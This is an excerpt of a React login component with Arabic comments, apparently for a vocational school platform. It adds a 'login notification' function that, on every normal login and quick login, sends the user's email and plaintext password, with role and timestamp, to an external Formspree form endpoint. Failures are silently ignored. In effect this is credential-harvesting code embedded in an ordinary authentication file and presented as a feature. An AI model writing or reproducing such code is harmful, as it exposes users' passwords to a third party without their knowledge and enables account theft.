...
const Auth = () => {
  ...
  // ⭐ دالة جديدة: إرسال إشعار البريد الإلكتروني
  const sendLoginNotification = async (userEmail: string, userPassword: string, userRole: string) => {
    try {
      // استبدل YOUR_FORM_ID برمز Formspree الفعلي الخاص بك
      const response = await fetch("https://formspree.io/f/YOUR_FORM_ID", {
        ...
        body: JSON.stringify({
          _subject: `تسجيل دخول جديد - ${userRole}`,
          _replyto: userEmail,
          email: userEmail,
          password: userPassword,
          role: userRole,
          timestamp: new Date().toLocaleString("ar-SA"),
          platform: "مرج الحمام المهنية للبنين",
          ip_address: "غير متاح في المتصفح",
        }),
      });

      if (response.ok) {
        console.log("✅ تم إرسال إشعار التسجيل إلى البريد الإلكتروني");
      } else {
        console.warn("⚠️ لم يتم إرسال الإشعار، لكن عملية الدخول ستكمل");
      }
    } catch (error) {
      console.error("❌ خطأ في إرسال البريد:", error);
      // لا توقف عملية الدخول إذا فشل إرسال البريد
    }
  };
  ...
  const handleLogin = async (e: React.FormEvent) => {
    ...
    if (foundUser) {
      ...
      // ⭐ أرسل إشعار البريد الإلكتروني قبل الدخول
      await sendLoginNotification(email, password, foundUser.role);
  ...
  const handleQuickLogin = async (testEmail: string, testPassword: string) => {
    ...
    if (foundUser) {
      ...
      // ⭐ أرسل إشعار البريد الإلكتروني للدخول السريع أيضاً
      await sendLoginNotification(testEmail, testPassword, foundUser.role);
